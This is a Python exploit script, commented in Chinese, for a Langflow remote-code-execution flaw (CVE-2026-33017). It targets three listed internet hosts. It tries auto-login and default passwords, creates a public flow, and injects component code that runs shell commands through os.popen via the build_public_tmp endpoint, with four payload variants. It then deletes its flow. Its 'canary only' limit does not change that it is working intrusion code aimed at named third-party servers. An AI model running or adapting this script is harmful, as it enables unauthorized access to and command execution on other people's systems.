#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-33017 (Langflow <1.9.0 build_public_tmp 未授权 RCE) — CN 实例只读定案验证
红线：只执行 `echo CANARY; id` 并回显，不弹 shell / 不写文件 / 不留持久化。
流程：版本复核 → auto_login → 默认口令 → 取/建 PUBLIC flow → build_public_tmp canary → 清理。
"""
import json, time, uuid, sys, requests

PROXY = {"http": "http://127.0.0.1:7897", "https": "http://127.0.0.1:7897"}
CANARY = "LF33017_CANARY"
OUT = r"E:\kimi\scan\fofa_pool\langflow_33017_verify.json"

TARGETS = {
    "http://222.213.23.164:8080": "1.7.2",
    "http://langflow-demo-2.microware1985.cn": "1.5.0.post1",
    "http://langflow-unify-test.crtvup.com.cn": "1.7.3",
}

DEFAULT_CREDS = [("langflow", "langflow"), ("admin", "admin"), ("admin", "admin123"), ("admin", "langflow")]

CMD = f"echo {CANARY}; id"

# ---- payload 变体（不同版本组件 API）----
def code_v_lfx():
    return (
        "from lfx.custom.custom_component.component import Component\n"
        "from lfx.io import Output\n"
        "from lfx.schema.data import Data\n"
        f"_r = __import__('os').popen({CMD!r}).read()\n"
        "class CanaryComp(Component):\n"
        "    display_name = 'Canary'\n"
        "    outputs = [Output(display_name='O', name='o', method='r')]\n"
        "    def r(self) -> Data:\n"
        "        return Data(data={'r': _r})\n"
    )

def code_v_new():
    return (
        "from langflow.custom import Component\n"
        "from langflow.io import Output\n"
        "from langflow.schema import Data\n"
        f"_r = __import__('os').popen({CMD!r}).read()\n"
        "class CanaryComp(Component):\n"
        "    display_name = 'Canary'\n"
        "    outputs = [Output(display_name='O', name='o', method='r')]\n"
        "    def r(self) -> Data:\n"
        "        return Data(data={'r': _r})\n"
    )

def code_v_raise():
    # 备用外带：异常文本回显（若 build 响应不回传 outputs）
    return (
        "from langflow.custom import Component\n"
        "from langflow.io import Output\n"
        f"_r = __import__('os').popen({CMD!r}).read()\n"
        "class CanaryComp(Component):\n"
        "    display_name = 'Canary'\n"
        "    outputs = [Output(display_name='O', name='o', method='r')]\n"
        "    def r(self):\n"
        "        raise Exception('CANARY_OUTPUT:' + _r)\n"
    )

def code_v_legacy():
    return (
        "from langflow.custom import CustomComponent\n"
        f"_r = __import__('os').popen({CMD!r}).read()\n"
        "class CanaryComp(CustomComponent):\n"
        "    display_name = 'Canary'\n"
        "    def build(self):\n"
        "        return _r\n"
    )

def flow_data(code, legacy=False):
    if legacy:
        node = {
            "id": "Canary",
            "data": {
                "id": "Canary",
                "type": "CustomComponent",
                "node": {
                    "template": {
                        "_type": "CustomComponent",
                        "code": {"type": "code", "value": code},
                        "class_name": {"type": "str", "value": "CanaryComp"},
                    },
                    "description": "canary",
                    "display_name": "Canary",
                },
            },
            "position": {"x": 0, "y": 0},
        }
    else:
        node = {
            "id": "Canary",
            "data": {
                "id": "Canary",
                "type": "CanaryComp",
                "node": {
                    "template": {
                        "_type": "Component",
                        "code": {"type": "code", "value": code},
                    },
                    "outputs": [{"types": ["Data"], "name": "o", "method": "r"}],
                },
            },
            "position": {"x": 0, "y": 0},
        }
    return {"nodes": [node], "edges": [], "viewport": {"x": 0, "y": 0, "zoom": 1}}

def req(method, url, **kw):
    kw.setdefault("timeout", 25)
    kw.setdefault("proxies", PROXY)
    kw.setdefault("verify", False)
    try:
        r = requests.request(method, url, **kw)
        return r.status_code, r.text
    except Exception as e:
        return None, f"__ERR__ {type(e).__name__}: {e}"

def login(base, user, pw):
    st, body = req("POST", base + "/api/v1/login",
                   data={"username": user, "password": pw},
                   headers={"Content-Type": "application/x-www-form-urlencoded"})
    tok = None
    try:
        tok = json.loads(body).get("access_token")
    except Exception:
        pass
    return st, tok, body[:200]

def get_token(base):
    # 1) auto_login
    st, body = req("POST", base + "/api/v1/auto_login", json={})
    try:
        tok = json.loads(body).get("access_token")
        if tok:
            return tok, "auto_login"
    except Exception:
        pass
    # 2) 默认口令
    for u, p in DEFAULT_CREDS:
        time.sleep(1.5)
        st, tok, _ = login(base, u, p)
        if tok:
            return tok, f"default_creds:{u}/{p}"
    return None, None

def find_or_make_public_flow(base, tok):
    """返回 (flow_id, src, created_id_or_None)"""
    h = {"Authorization": f"Bearer {tok}"}
    # 已有 PUBLIC flow?
    st, body = req("GET", base + "/api/v1/flows/", headers=h)
    try:
        flows = json.loads(body)
        for f in flows:
            if isinstance(f, dict) and f.get("access_type") == "PUBLIC":
                return f["id"], "existing_public", None
    except Exception:
        pass
    # 新建
    payload = {"name": f"tmp-check-{uuid.uuid4().hex[:8]}",
               "data": {"nodes": [], "edges": [], "viewport": {"x": 0, "y": 0, "zoom": 1}},
               "is_component": False, "access_type": "PUBLIC"}
    st, body = req("POST", base + "/api/v1/flows/", headers=h, json=payload)
    fid = None
    try:
        fid = json.loads(body).get("id")
    except Exception:
        pass
    if fid:
        # 确保 PUBLIC（旧版创建时可能忽略 access_type）
        time.sleep(1.5)
        req("PATCH", base + f"/api/v1/flows/{fid}", headers=h, json={"access_type": "PUBLIC"})
        return fid, "created", fid
    return None, f"create_failed:{st}:{body[:150]}", None

def try_build(base, fid, code, legacy=False):
    url = base + f"/api/v1/build_public_tmp/{fid}/flow?event_delivery=direct&log_builds=false"
    st, body = req("POST", url, json={"data": flow_data(code, legacy)},
                   cookies={"client_id": "cnvd-check"})
    hit = CANARY in body and "uid=" in body
    return st, hit, body

def main():
    results = {}
    for base, ver0 in TARGETS.items():
        base = base.rstrip("/")
        rec = {"ver_1008": ver0}
        print(f"\n===== {base} (10-08 版本 {ver0}) =====")
        # 1) 版本复核
        st, body = req("GET", base + "/api/v1/version")
        rec["version_status"] = st
        try:
            ver = json.loads(body)
            rec["version"] = ver.get("version") if isinstance(ver, dict) else str(ver)
        except Exception:
            rec["version_raw"] = body[:120]
        print(f"  version: {rec.get('version', rec.get('version_raw'))} (HTTP {st})")
        time.sleep(1.5)
        # 2) 拿 token
        tok, how = get_token(base)
        rec["token_how"] = how
        print(f"  token: {how}")
        fid = None
        created = None
        if tok:
            time.sleep(1.5)
            fid, src, created = find_or_make_public_flow(base, tok)
            rec["flow_src"] = src
            print(f"  public flow: {src} -> {fid}")
        else:
            # 无凭证：探 endpoint 是否存在校验（随机 UUID）
            time.sleep(1.5)
            st, body = req("POST", base + f"/api/v1/build_public_tmp/{uuid.uuid4()}/flow?event_delivery=direct",
                           json={"data": flow_data(code_v_new())}, cookies={"client_id": "cnvd-check"})
            rec["probe_noauth_status"] = st
            rec["probe_noauth_body"] = body[:200]
            print(f"  无凭证探测 build_public_tmp: HTTP {st} {body[:120]}")
        # 3) canary
        if fid:
            variants = [("lfx", code_v_lfx(), False), ("new", code_v_new(), False),
                        ("raise", code_v_raise(), False), ("legacy", code_v_legacy(), True)]
            for name, code, legacy in variants:
                time.sleep(1.5)
                st, hit, body = try_build(base, fid, code, legacy)
                rec[f"build_{name}_status"] = st
                print(f"  build[{name}]: HTTP {st} canary={'YES' if hit else 'no'}")
                if hit:
                    rec["confirmed"] = True
                    rec["variant"] = name
                    i = body.find(CANARY)
                    rec["evidence"] = body[max(0, i - 40): i + 120]
                    break
                else:
                    rec[f"build_{name}_head"] = body[:200]
            # 4) 清理自建 flow
            if created and tok:
                time.sleep(1.5)
                st, _ = req("DELETE", base + f"/api/v1/flows/{created}",
                            headers={"Authorization": f"Bearer {tok}"})
                rec["cleanup_delete_status"] = st
                print(f"  cleanup delete: HTTP {st}")
        results[base] = rec
        with open(OUT, "w", encoding="utf-8") as fp:
            json.dump(results, fp, ensure_ascii=False, indent=2)
    print("\n=== 汇总 ===")
    for b, r in results.items():
        print(b, "=>", "定案" if r.get("confirmed") else "未证实", "| token:", r.get("token_how"), "| ver:", r.get("version", r.get("version_raw")))

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()
